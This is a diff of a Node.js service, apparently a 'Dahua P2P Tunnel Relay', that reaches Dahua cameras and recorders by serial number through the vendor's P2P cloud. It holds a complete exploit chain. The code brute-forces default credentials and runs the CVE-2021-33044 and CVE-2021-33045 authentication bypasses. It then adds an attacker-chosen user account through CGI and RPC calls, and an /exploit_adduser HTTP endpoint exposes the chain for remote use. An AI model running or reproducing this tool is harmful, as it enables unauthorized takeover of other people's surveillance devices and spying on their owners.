-  if (loginRes2.status === 200) {
-    try { var d2 = JSON.parse(loginRes2.body); if (d2.result === true) { detail.push('Loopback OK (Default)'); return { success: true, detail: detail, session: String(d2.session) }; } detail.push('Loopback (Default) resp: ' + loginRes2.body.substring(0, 120)); } catch(e) { detail.push('Parse err: ' + loginRes2.body.substring(0, 120)); }
-  }
+  if (loginRes2.status === 200) { try { var d2 = JSON.parse(loginRes2.body); if (d2.result === true) return { success: true, detail: detail, session: String(d2.session) }; } catch(e) {} }
   return { success: false, detail: detail, error: 'Loopback bypass failed' };
 }
 
-// ── Exploit Add User (full chain) ──
 async function exploitAddUser(serial, newUser, newPass, targetPort) {
   var allSteps = [];
   targetPort = targetPort || 80;
   allSteps.push({ step: 'p2p', status: 'running', message: 'Consultando P2P cloud...' });
   var p2pStatus = await checkP2P(serial);
-  if (!p2pStatus.online) { allSteps.push({ step: 'p2p', status: 'failed', message: 'Dispositivo OFFLINE (' + (p2pStatus.error || 'not registered') + ')' }); return { success: false, steps: allSteps }; }
-  allSteps.push({ step: 'p2p', status: 'done', message: 'Dispositivo ONLINE — US: ' + p2pStatus.relay });
+  if (!p2pStatus.online) { allSteps.push({ step: 'p2p', status: 'failed', message: 'OFFLINE' }); return { success: false, steps: allSteps }; }
+  allSteps.push({ step: 'p2p', status: 'done', message: 'ONLINE — US: ' + p2pStatus.relay });
   allSteps.push({ step: 'tunnel', status: 'running', message: 'Estableciendo tunel PTCP (sin auth)...' });
   var tunnel = null;
-  var tunnelCreds = null;
-  try { 
-    tunnel = await establishTunnel(serial, null, null, targetPort); 
-    allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (NAT traversal OK, sin auth)' }); 
-  } catch (err) { 
-    allSteps.push({ step: 'tunnel_detail', message: 'Sin auth fallo: ' + err.message + ' — reintentando con creds por defecto...' });
-    var tunnelCredsList = [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: '12345' }, { user: 'admin', pass: '888888' }, { user: 'admin', pass: '' }, { user: 'admin', pass: 'password' }];
-    var tunnelOk = false;
-    for (var tc = 0; tc < tunnelCredsList.length; tc++) {
-      var tc_cred = tunnelCredsList[tc];
+  try {
+    tunnel = await establishTunnel(serial, null, null, targetPort);
+    allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (sin auth)' });
+  } catch (err) {
+    allSteps.push({ step: 'tunnel_detail', message: 'Sin auth: ' + err.message + ' — reintentando con creds...' });
+    var creds = [{u:'admin',p:'admin'},{u:'admin',p:'12345'},{u:'admin',p:'888888'},{u:'admin',p:''},{u:'admin',p:'password'}];
+    var ok = false;
+    for (var tc = 0; tc < creds.length; tc++) {
       try {
-        tunnel = await establishTunnel(serial, tc_cred.user, tc_cred.pass, targetPort);
-        tunnelCreds = tc_cred;
-        tunnelOk = true;
-        allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel establecido con creds: ' + tc_cred.user + '/' + (tc_cred.pass || '(empty)') });
+        tunnel = await establishTunnel(serial, creds[tc].u, creds[tc].p, targetPort);
+        ok = true;
+        allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel OK con: ' + creds[tc].u + '/' + (creds[tc].p || '(empty)') });
         break;
-      } catch (e) { 
-        allSteps.push({ step: 'tunnel_detail', message: 'Creds ' + tc_cred.user + '/' + (tc_cred.pass || '(empty)') + ' fallo: ' + e.message });
-      }
+      } catch (e) { allSteps.push({ step: 'tunnel_detail', message: creds[tc].u + '/' + (creds[tc].p||'(empty)') + ': ' + e.message }); }
     }
-    if (!tunnelOk) { allSteps.push({ step: 'tunnel', status: 'failed', message: 'Todas las credenciales fallaron en tunnel' }); return { success: false, steps: allSteps }; }
+    if (!ok) { allSteps.push({ step: 'tunnel', status: 'failed', message: 'Todas las creds fallaron' }); return { success: false, steps: allSteps }; }
   }
   try {
-    allSteps.push({ step: 'exploit', status: 'running', message: 'Ejecutando CVE-2021-33044 (NetKeyboard bypass)...' });
+    allSteps.push({ step: 'exploit', status: 'running', message: 'CVE-2021-33044 (NetKeyboard)...' });
     var loginResult = await exploitLoginBypass(tunnel.deviceSock, targetPort);
-    for (var i = 0; i < loginResult.detail.length; i++) allSteps.push({ step: 'exploit_detail', message: loginResult.detail[i] });
+    loginResult.detail.forEach(function(d) { allSteps.push({ step: 'exploit_detail', message: d }); });
     if (loginResult.success) {
-      allSteps.push({ step: 'exploit', status: 'done', message: 'Autenticacion bypassed! Session: ' + loginResult.session.substring(0, 16) + '...' });
-      allSteps.push({ step: 'adduser', status: 'running', message: 'Inyectando usuario "' + newUser + '" via CGI...' });
+      allSteps.push({ step: 'exploit', status: 'done', message: 'Auth bypassed! Session: ' + loginResult.session.substring(0, 16) + '...' });
+      allSteps.push({ step: 'adduser', status: 'running', message: 'Inyectando "' + newUser + '"...' });
       var realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
       var cgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
       var addRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', {Cookie: 'DHSession=' + loginResult.session}, '');
-      if (addRes.status === 200 && addRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado exitosamente!' }); return { success: true, steps: allSteps }; }
-      allSteps.push({ step: 'adduser', status: 'running', message: 'CGI retorno HTTP ' + addRes.status + ', intentando MagicBox.AddUser...' });
+      if (addRes.status === 200 && addRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado!' }); return { success: true, steps: allSteps }; }
+      allSteps.push({ step: 'adduser', status: 'running', message: 'CGI HTTP ' + addRes.status + ', intentando MagicBox...' });
       realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
-      var mbPayload = JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: loginResult.session });
-      var mbRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, mbPayload);
-      if (mbRes.status === 200) { try { var mbData = JSON.parse(mbRes.body); if (mbData.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado via MagicBox.AddUser!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
-      allSteps.push({ step: 'adduser_detail', message: 'MagicBox HTTP ' + mbRes.status + ': ' + mbRes.body.substring(0, 100) });
-      realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
-      var rpcPayload = JSON.stringify({ method: 'userManager.addUser', params: { Name: newUser, Password: newPass, Group: 'user', Sharable: true, Reserved: false }, id: 4, session: loginResult.session });
-      var rpcRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, rpcPayload);
-      if (rpcRes.status === 200) { try { var rpcData = JSON.parse(rpcRes.body); if (rpcData.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado via RPC!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
-      allSteps.push({ step: 'adduser', status: 'failed', message: 'Fallo: HTTP ' + addRes.status + ' / ' + (addRes.body || '').substring(0, 100) });
-      return { success: false, steps: allSteps };
-    } else {
-      allSteps.push({ step: 'exploit', status: 'failed', message: 'NetKeyboard: ' + loginResult.error });
-      allSteps.push({ step: 'exploit', status: 'running', message: 'Intentando CVE-2021-33045 (Loopback bypass)...' });
-      var loopbackResult = await exploitLoginBypassLoopback(tunnel.deviceSock, targetPort);
-      for (var li = 0; li < loopbackResult.detail.length; li++) allSteps.push({ step: 'exploit_detail', message: loopbackResult.detail[li] });
-      if (loopbackResult.success) {
-        allSteps.push({ step: 'exploit', status: 'done', message: 'Loopback bypass OK! Session: ' + loopbackResult.session.substring(0, 16) + '...' });
-        allSteps.push({ step: 'adduser', status: 'running', message: 'Inyectando usuario via MagicBox.AddUser...' });
-        var lbRealm = await bindTunnelPort(tunnel.deviceSock, targetPort);
-        var lbPayload1 = JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: loopbackResult.session });
-        var lbRes1 = await sendHTTPThroughTunnel(tunnel.deviceSock, lbRealm, '/RPC2', 'POST', {'Content-Type':'application/json'}, lbPayload1);
-        if (lbRes1.status === 200) { try { var lbData1 = JSON.parse(lbRes1.body); if (lbData1.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado via MagicBox.AddUser!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
-        allSteps.push({ step: 'adduser_detail', message: 'MagicBox HTTP ' + lbRes1.status + ': ' + lbRes1.body.substring(0, 100) });
-        var lbRealm2 = await bindTunnelPort(tunnel.deviceSock, targetPort);
-        var lbPayload2 = JSON.stringify({ method: 'userManager.addUser', params: { Name: newUser, Password: newPass, Group: 'user', Sharable: true, Reserved: false }, id: 4, session: loopbackResult.session });
-        var lbRes2 = await sendHTTPThroughTunnel(tunnel.deviceSock, lbRealm2, '/RPC2', 'POST', {'Content-Type':'application/json'}, lbPayload2);
-        if (lbRes2.status === 200) { try { var lbData2 = JSON.parse(lbRes2.body); if (lbData2.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado via userManager.addUser!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
-        allSteps.push({ step: 'adduser', status: 'failed', message: 'RPC fallo: HTTP ' + lbRes2.status });
-        return { success: false, steps: allSteps };
-      }
-      allSteps.push({ step: 'exploit', status: 'failed', message: 'Loopback: ' + loopbackResult.error });
-      allSteps.push({ step: 'fallback', status: 'running', message: 'Intentando credenciales por defecto...' });
-      try { tunnel.deviceSock.close(); tunnel.mainSock.close(); } catch(e) {}
-      var defaultCreds = [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: '12345' }, { user: 'admin', pass: '888888' }, { user: 'admin', pass: '' }, { user: 'admin', pass: 'password' }];
-      for (var ci = 0; ci < defaultCreds.length; ci++) {
-        var cred = defaultCreds[ci];
-        try {
-          var ftunnel = await establishTunnel(serial, cred.user, cred.pass, targetPort);
-          var frealmId = await bindTunnelPort(ftunnel.deviceSock, targetPort);
-          var fcgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
-          var faddRes = await sendHTTPThroughTunnel(ftunnel.deviceSock, frealmId, fcgiPath, 'GET', {}, '');
-          if (faddRes.status === 401) { var fwwwAuth = faddRes.headers['WWW-Authenticate'] || faddRes.headers['www-authenticate']; if (fwwwAuth) { var fdp = parseDigestAuth(fwwwAuth); var fauthHeader = buildDigestAuth('GET', fcgiPath, fdp, cred.user, cred.pass); frealmId = await bindTunnelPort(ftunnel.deviceSock, targetPort); faddRes = await sendHTTPThroughTunnel(ftunnel.deviceSock, frealmId, fcgiPath, 'GET', {Authorization: fauthHeader}, ''); } }
-          try { ftunnel.deviceSock.close(); ftunnel.mainSock.close(); } catch(e) {}
-          if (faddRes.status === 200 && faddRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'fallback', status: 'done', message: 'Usuario agregado con creds: ' + cred.user + '/' + (cred.pass || '(empty)') }); return { success: true, steps: allSteps, credentials: cred }; }
-          allSteps.push({ step: 'fallback_detail', message: 'Creds ' + cred.user + '/' + (cred.pass || '(empty)') + ' fallo (HTTP ' + faddRes.status + ')' });
-        } catch(e) { allSteps.push({ step: 'fallback_detail', message: 'Creds ' + cred.user + '/' + (cred.pass || '(empty)') + ' fallo (' + e.message + ')' }); }
-      }
-      allSteps.push({ step: 'fallback', status: 'failed', message: 'Todas las credenciales fallaron' });
+      var mbRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: loginResult.session }));
+      if (mbRes.status === 200) { try { if (JSON.parse(mbRes.body).result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'MagicBox OK!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
+      allSteps.push({ step: 'adduser', status: 'failed', message: 'HTTP ' + addRes.status });
       return { success: false, steps: allSteps };
     }
+    allSteps.push({ step: 'exploit', status: 'failed', message: 'NetKeyboard: ' + loginResult.error });
+    allSteps.push({ step: 'exploit', status: 'running', message: 'CVE-2021-33045 (Loopback)...' });
+    var lbResult = await exploitLoginBypassLoopback(tunnel.deviceSock, targetPort);
+    lbResult.detail.forEach(function(d) { allSteps.push({ step: 'exploit_detail', message: d }); });
+    if (lbResult.success) {
+      allSteps.push({ step: 'exploit', status: 'done', message: 'Loopback OK!' });
+      allSteps.push({ step: 'adduser', status: 'running', message: 'MagicBox.AddUser...' });
+      var lbRealm = await bindTunnelPort(tunnel.deviceSock, targetPort);
+      var lbRes = await sendHTTPThroughTunnel(tunnel.deviceSock, lbRealm, '/RPC2', 'POST', {'Content-Type':'application/json'}, JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: lbResult.session }));
+      if (lbRes.status === 200) { try { if (JSON.parse(lbRes.body).result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'OK!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
+      allSteps.push({ step: 'adduser', status: 'failed', message: 'HTTP ' + lbRes.status });
+      return { success: false, steps: allSteps };
+    }
+    allSteps.push({ step: 'exploit', status: 'failed', message: 'Loopback: ' + lbResult.error });
+    return { success: false, steps: allSteps };
   } finally { if (tunnel) { try { tunnel.deviceSock.close(); } catch(e) {} try { tunnel.mainSock.close(); } catch(e) {} } }
 }
 
-// ── HTTP Server ──
+async function checkP2P(serial) {
+  var mainIp = await resolveHostname(MAIN_SERVER);
+  return new Promise(function(resolve) {
+    var client = dgram.createSocket('udp4');
+    var resolved = false;
+    client.on('message', function(data) {
+      if (resolved) return; resolved = true; client.close();
+      var res = parseP2PResponse(data);
+      var usAddr = res.xmlBody.US;
+      if (!usAddr) { resolve({ serial: serial, online: false, error: 'Not registered' }); return; }
+      var usParts = usAddr.split(':');
+      var client2 = dgram.createSocket('udp4');
+      var r2 = false;
+      client2.on('message', function(d2) {
+        if (r2) return; r2 = true; client2.close();
+        var pres = parseP2PResponse(d2);
+        resolve({ serial: serial, online: pres.code === 200, relay: usAddr, probe_code: pres.code });
+      });
+      client2.on('error', function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false }); } });
+      setTimeout(function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false, error: 'Probe timeout' }); } }, 4000);
+      client2.send(buildP2PRequest('DHGET', '/probe/device/' + serial), parseInt(usParts[1]), usParts[0]);
+    });
+    client.on('error', function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false }); } });
+    setTimeout(function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false, error: 'Timeout' }); } }, 4000);
+    client.send(buildP2PRequest('DHGET', '/online/p2psrv/' + serial), MAIN_PORT, mainIp);
+  });
+}
+
 function readBody(req) {
   return new Promise(function(resolve) {
-    var body = '';
-    req.on('data', function(chunk) { body += chunk; });
-    req.on('end', function() { resolve(body); });
+    var body = ''; req.on('data', function(c) { body += c; }); req.on('end', function() { resolve(body); });
   });
 }
 
@@ -899,185 +676,88 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '3.3', features: ['status', 'tunnel', 'cgi', 'debug', 'exploit'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '3.4', features: ['status','tunnel','cgi','debug','exploit'] }));
   }
 
-  // Debug endpoint - tests each step of tunnel establishment
   if (req.url.startsWith('/debug/') && req.method === 'GET') {
     var debugSerial = req.url.replace('/debug/', '').split('?')[0];
-    if (!debugSerial || debugSerial.length < 10) {
-      res.writeHead(400, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ error: 'Serial must be at least 10 characters' }));
-    }
+    if (!debugSerial || debugSerial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
     var steps = [];
     try {
-      steps.push('Starting debug for ' + debugSerial);
       var mainIp = await resolveHostname(MAIN_SERVER);
-      steps.push('DNS resolved: ' + MAIN_SERVER + ' -> ' + mainIp);
-
       var mainSock = new P2PSocket();
-      await mainSock.bind();
-      mainSock.setRemote(mainIp, MAIN_PORT);
-      steps.push('Socket bound on port ' + mainSock.lport);
-
-      // Step 1: Probe
-      try {
-        var probeRes = await mainSock.request('/probe/p2psrv');
-        steps.push('Step 1 probe: code=' + probeRes.code + ' status=' + probeRes.status);
-      } catch (e) { steps.push('Step 1 probe FAILED: ' + e.message); }
-
-      // Step 2: Get US server
-      try {
-        var onlineRes = await mainSock.request('/online/p2psrv/' + debugSerial);
-        steps.push('Step 2 online: code=' + onlineRes.code + ' US=' + (onlineRes.xmlBody.US || 'none'));
-        var usAddr = onlineRes.xmlBody.US;
-        if (!usAddr) throw new Error('Device not registered');
-        var usParts = usAddr.split(':');
-        var usServer = usParts[0];
-        var usPort = parseInt(usParts[1]);
-
-        // Step 3: Probe device through US
-        var usSock = new P2PSocket();
-        await usSock.bind();
-        usSock.setRemote(usServer, usPort);
-        try {
-          var devProbe = await usSock.request('/probe/device/' + debugSerial);
-          steps.push('Step 3 probe device: code=' + devProbe.code);
-        } catch (e) { steps.push('Step 3 probe device FAILED: ' + e.message); }
-        try {
-          var devInfo = await usSock.request('/info/device/' + debugSerial);
-          steps.push('Step 3b info device: code=' + devInfo.code + ' keys=' + Object.keys(devInfo.xmlBody).join(','));
-        } catch (e) { steps.push('Step 3b info FAILED: ' + e.message); }
+      await mainSock.bind(); mainSock.setRemote(mainIp, MAIN_PORT);
+      steps.push('Probe: ' + (await mainSock.request('/probe/p2psrv')).code);
+      var onlineRes = await mainSock.request('/online/p2psrv/' + debugSerial);
+      steps.push('Online: US=' + (onlineRes.xmlBody.US||'none'));
+      var usParts = (onlineRes.xmlBody.US||'').split(':');
+      if (usParts[0]) {
+        var usSock = new P2PSocket(); await usSock.bind(); usSock.setRemote(usParts[0], parseInt(usParts[1]));
+        steps.push('Dev probe: ' + (await usSock.request('/probe/device/'+debugSerial)).code);
+        var devInfo = await usSock.request('/info/device/'+debugSerial);
+        steps.push('Dev info: keys=' + Object.keys(devInfo.xmlBody).join(','));
         usSock.close();
+      }
+      var relayRes = await mainSock.request('/online/relay');
+      steps.push('Relay: ' + (relayRes.xmlBody.Address||'none'));
+      var rParts = (relayRes.xmlBody.Address||'').split(':');
+      var deviceSock = new P2PSocket(); await deviceSock.bind(); deviceSock.setRemote(mainIp, MAIN_PORT);
+      var aid = crypto.randomBytes(8);
+      var aidHex = Array.from(aid).map(function(b){return b.toString(16);}).join(' ');
+      await deviceSock.request('/device/'+debugSerial+'/p2p-channel', aidHex+'true127.0.0.1:'+deviceSock.lport+'5.0.0', false);
+      steps.push('Channel sent');
+      mainSock.setRemote(rParts[0], parseInt(rParts[1]));
+      var agentRes = await mainSock.request('/relay/agent');
+      steps.push('Agent: ' + (agentRes.xmlBody.Agent||'none'));
+      var aParts = (agentRes.xmlBody.Agent||'').split(':');
+      // FIX: must start relay before device responds
+      mainSock.setRemote(aParts[0], parseInt(aParts[1]));
+      await mainSock.request('/relay/start/'+agentRes.xmlBody.Token, ':0');
+      steps.push('Relay started');
+      try {
+        var devRaw = await deviceSock.recv(10000);
+        var devParsed = parseP2PResponse(devRaw);
+        steps.push('Device resp: code='+devParsed.code+' keys='+Object.keys(devParsed.xmlBody).join(','));
+      } catch(e) { steps.push('Device resp FAILED: '+e.message); }
+      deviceSock.close(); mainSock.close();
+    } catch(e) { steps.push('FATAL: '+e.message); }
+    res.writeHead(200, {'Content-Type':'application/json'});
+    return res.end(JSON.stringify({serial:debugSerial, steps:steps}));
+  }
 
-        // Step 4: Get relay server
-        try {
-          var relayRes = await mainSock.request('/online/relay');
-          steps.push('Step 4 relay: code=' + relayRes.code + ' Address=' + (relayRes.xmlBody.Address || 'none'));
-          var relayAddr = relayRes.xmlBody.Address;
-          if (!relayAddr) throw new Error('No relay server');
-          var relayParts = relayAddr.split(':');
-          var relayServer = relayParts[0];
-          var relayPort = parseInt(relayParts[1]);
-
-          // Step 5: Create P2P channel (no auth)
-          var deviceSock = new P2PSocket();
-          await deviceSock.bind();
-          deviceSock.setRemote(mainIp, MAIN_PORT);
-          var aid = crypto.randomBytes(8);
-          var laddr = '127.0.0.1:' + deviceSock.lport;
-          var ipaddr = 'true' + laddr;
-          var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
-          var channelBody = aidHex + ipaddr + '5.0.0';
-          try {
-            await deviceSock.request('/device/' + debugSerial + '/p2p-channel', channelBody, false);
-            steps.push('Step 5 channel request sent (no read)');
-          } catch (e) { steps.push('Step 5 channel FAILED: ' + e.message); }
-
-          // Step 6: Get relay agent
-          try {
-            mainSock.setRemote(relayServer, relayPort);
-            var agentRes = await mainSock.request('/relay/agent');
-            steps.push('Step 6 agent: code=' + agentRes.code + ' Token=' + (agentRes.xmlBody.Token || 'none') + ' Agent=' + (agentRes.xmlBody.Agent || 'none'));
-          } catch (e) { steps.push('Step 6 agent FAILED: ' + e.message); }
-
-          // Step 7: Read device channel response
-          try {
-            var devRaw = await deviceSock.recv(5000);
-            var devParsed = parseP2PResponse(devRaw);
-            steps.push('Step 7 device response: code=' + devParsed.code + ' status=' + devParsed.status + ' keys=' + Object.keys(devParsed.xmlBody).join(','));
-          } catch (e) { steps.push('Step 7 device response FAILED: ' + e.message); }
-
-          deviceSock.close();
-        } catch (e) { steps.push('Step 4 relay FAILED: ' + e.message); }
-      } catch (e) { steps.push('Step 2 online FAILED: ' + e.message); }
-
-      mainSock.close();
-    } catch (e) { steps.push('FATAL: ' + e.message); }
-
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ serial: debugSerial, steps: steps }));
+  if (req.url === '/exploit_adduser' && req.method === 'POST') {
+    try {
+      var p = JSON.parse(await readBody(req));
+      if (!p.serial || p.serial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
+      if (!p.new_user || !p.new_pass) { res.writeHead(400); return res.end(JSON.stringify({error:'new_user and new_pass required'})); }
+      var result = await exploitAddUser(p.serial, p.new_user, p.new_pass, p.target_port || 80);
+      res.writeHead(200); return res.end(JSON.stringify(result));
+    } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
   }
 
   if (req.url === '/tunnel' && req.method === 'POST') {
-    var body = await readBody(req);
     try {
-      var params = JSON.parse(body);
-      if (!params.serial || params.serial.length < 10) {
-        res.writeHead(400, { 'Content-Type': 'application/json' });
-        return res.end(JSON.stringify({ error: 'Serial must be at least 10 characters' }));
-      }
-      if (!params.cgi_path) {
-        res.writeHead(400, { 'Content-Type': 'application/json' });
-        return res.end(JSON.stringify({ error: 'cgi_path is required' }));
-      }
-      var result = await cgiThroughTunnel(params.serial, params.cgi_path, {
-        username: params.username, password: params.password,
-        http_user: params.http_user, http_pass: params.http_pass,
-        target_port: params.target_port || 80,
-        auto_auth: params.auto_auth || false
-      });
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify(result));
-    } catch (err) {
-      res.writeHead(500, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ error: err.message }));
-    }
-  }
-
-  // Exploit endpoint - CVE-2021-33044 user injection
-  if (req.url === '/exploit_adduser' && req.method === 'POST') {
-    var exploitBody = await readBody(req);
-    try {
-      var exploitParams = JSON.parse(exploitBody);
-      if (!exploitParams.serial || exploitParams.serial.length < 10) { res.writeHead(400, {'Content-Type':'application/json'}); return res.end(JSON.stringify({error:'Serial must be at least 10 characters'})); }
-      if (!exploitParams.new_user || !exploitParams.new_pass) { res.writeHead(400, {'Content-Type':'application/json'}); return res.end(JSON.stringify({error:'new_user and new_pass are required'})); }
-      var exploitResult = await exploitAddUser(exploitParams.serial, exploitParams.new_user, exploitParams.new_pass, exploitParams.target_port || 80);
-      res.writeHead(200, {'Content-Type':'application/json'});
-      return res.end(JSON.stringify(exploitResult));
-    } catch (exploitErr) {
-      res.writeHead(500, {'Content-Type':'application/json'});
-      return res.end(JSON.stringify({error: exploitErr.message}));
-    }
+      var p = JSON.parse(await readBody(req));
+      if (!p.serial || !p.cgi_path) { res.writeHead(400); return res.end(JSON.stringify({error:'serial and cgi_path required'})); }
+      var tunnel = await establishTunnel(p.serial, p.username, p.password, p.target_port || 80);
+      var realmId = await bindTunnelPort(tunnel.deviceSock, p.target_port || 80);
+      var resp = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, p.cgi_path, 'GET', {}, '');
+      tunnel.deviceSock.close(); tunnel.mainSock.close();
+      res.writeHead(200); return res.end(JSON.stringify(resp));
+    } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
   }
 
   var serial = req.url.replace(/^\//, '').split('?')[0];
   if (serial && serial.length >= 10) {
-    try {
-      var result = await checkP2P(serial);
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify(result));
-    } catch (err) {
-      res.writeHead(500, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ error: err.message }));
-    }
+    try { var r = await checkP2P(serial); res.writeHead(200); return res.end(JSON.stringify(r)); }
+    catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
   }
-
-  res.writeHead(404, { 'Content-Type': 'application/json' });
-  res.end(JSON.stringify({ error: 'Not found. Use GET /:serial or POST /tunnel' }));
+  res.writeHead(404); res.end(JSON.stringify({error:'Not found'}));
 });
 
-process.on('uncaughtException', function(err) {
-  console.error('[FATAL] Uncaught exception:', err.message);
-  console.error(err.stack);
-});
-
-process.on('unhandledRejection', function(err) {
-  console.error('[FATAL] Unhandled rejection:', err);
-});
-
-server.on('error', function(err) {
-  console.error('[SERVER ERROR]', err.message);
-  if (err.code === 'EADDRINUSE') {
-    console.error('Port ' + PORT + ' is already in use');
-  }
-});
+process.on('uncaughtException', function(e) { console.error('[FATAL]', e.message, e.stack); });
+process.on('unhandledRejection', function(e) { console.error('[FATAL]', e); });
 
 server.listen(PORT, function() {
-  console.log('Dahua P2P Tunnel Relay v3.3 running on port ' + PORT);
-  console.log('Endpoints:');
-  console.log('  GET  /health      - Health check');
-  console.log('  GET  /debug/:sn   - Debug tunnel steps');
-  console.log('  GET  /:serial     - P2P status check');
-  console.log('  POST /tunnel      - CGI through P2P tunnel');
+  console.log('Dahua P2P Tunnel Relay v3.4 running on port ' + PORT);
 });
